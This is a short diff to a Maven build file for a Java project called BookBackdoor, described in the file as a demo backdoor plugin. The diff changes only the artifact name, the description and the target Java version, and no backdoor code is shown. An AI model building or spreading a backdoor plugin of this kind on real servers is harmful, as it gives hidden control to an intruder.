@@ -5,15 +5,15 @@
     <modelVersion>4.0.0</modelVersion>
 
     <groupId>org.brandonplank</groupId>
-    <artifactId>bookbackdoor</artifactId>
+    <artifactId>BookBackdoor</artifactId>
     <version>1.0-SNAPSHOT</version>
     <packaging>jar</packaging>
 
     <name>BookBackdoor</name>
 
-    <description>A demo plugin that has the BookBackdoor inside of it!</description>
+    <description>Demo backdoor plugin</description>
     <properties>
-        <java.version>11</java.version>
+        <java.version>1.8</java.version>
         <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
     </properties>
     <url>https://brandonplank.org</url>
